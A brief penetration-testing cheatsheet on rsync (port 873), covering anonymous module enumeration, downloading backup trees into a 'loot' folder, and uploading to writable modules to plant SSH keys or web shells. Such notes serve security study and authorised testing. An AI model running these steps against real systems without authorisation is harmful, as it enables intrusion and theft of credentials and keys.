# rsync (873)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Often left open on backup servers and file-sync boxes. Anonymous access to rsync modules is common and gives you direct read (sometimes write) of entire backup trees — credentials, configs, SSH keys, historical secrets. Listing modules requires no auth on most defaults. **Common attack vectors:** anonymous module enumeration, world-readable backup harvest, writable module → SSH key plant or web shell drop, credential reuse from harvested configs.

## Enumerate modules

```bash
nmap -sV -p 873 $IP
rsync --list-only rsync://$IP/
rsync --list-only rsync://$IP/module_name/
```

## Download files

```bash
rsync -av rsync://$IP/module_name/ /tmp/rsync_loot/
rsync -av rsync://user@$IP/module_name/ /tmp/rsync_loot/
```

## Upload (if writable)

```bash
rsync -av /path/to/local/file rsync://$IP/module_name/
```

## Common findings

- Anonymous access to sensitive modules (config files, backups)
- Writable modules → upload web shell or SSH key
